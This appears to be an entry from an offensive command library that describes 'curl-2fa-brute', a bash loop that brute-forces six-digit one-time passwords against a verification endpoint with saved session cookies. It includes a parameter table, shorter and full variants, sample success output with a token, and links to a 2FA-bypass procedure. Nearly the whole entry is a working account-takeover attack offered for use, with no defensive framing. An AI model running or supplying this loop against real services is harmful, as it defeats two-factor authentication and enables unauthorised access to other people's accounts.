---
id: cmd-curl-brute-001
data: >-
  for otp in $(seq -w 0 999999); do curl -X POST
  https://target.com/api/verify-otp -b cookies.txt -H "Content-Type:
  application/json" -d '{"otp": "'$otp'"}' -o response_$otp.json -s; if grep -q
  '"authenticated": true' response_$otp.json; then echo "Success! OTP: $otp";
  cat response_$otp.json; break; fi; done
tags:
  - web
  - brute-force
  - auth
type: command
output: |-
  Success! OTP: 123456
  {"authenticated": true, "token": "eyJ..."}
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:42.599Z'
verified: false
validated: true
submitted: true
---
# curl-2fa-brute

## Command

```bash
for otp in $(seq -w 0 999999); do curl -X POST https://target.com/api/verify-otp -b cookies.txt -H "Content-Type: application/json" -d '{"otp": "'$otp'"}' -o response_$otp.json -s; if grep -q '"authenticated": true' response_$otp.json; then echo "Success! OTP: $otp"; cat response_$otp.json; break; fi; done
```

## Description

This bash loop uses curl to brute-force 6-digit OTP codes by submitting sequential guesses to the verification endpoint, checking each response for authentication success.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for otp in $(seq -w 0 999999)` | Generates padded numbers 000000-999999 | Yes |
| `-X POST` | HTTP POST method | Yes |
| `-b cookies.txt` | Loads session cookies | Yes |
| `-H "Content-Type: application/json"` | JSON header | Yes |
| `-d '{"otp": "'$otp'"}'` | Submits OTP payload | Yes |
| `-o response_$otp.json` | Saves response per attempt | Yes |
| `-s` | Silent mode | Yes |
| `grep -q ...` | Checks for success indicator | Yes |

## Examples

### Basic Usage

```bash
for otp in $(seq -w 0 100); do curl -X POST https://target.com/verify -d "otp=$otp"; done
```

### Advanced Usage

```bash
for otp in $(seq -w 0 999999); do curl -X POST https://target.com/api/verify-otp -b cookies.txt -d '{"otp": "'$otp'"}' -s | grep 'authenticated'; done
```

## Expected Output

On match: "Success! OTP: XXXXXX" followed by auth JSON. Failed attempts produce error JSON like {"error": "invalid_otp"}.

## Related

- [[commands/curl-trigger-otp]]
- [[procedures/Brute-Force-2FA-OTP-to-Bypass-Authentication]]
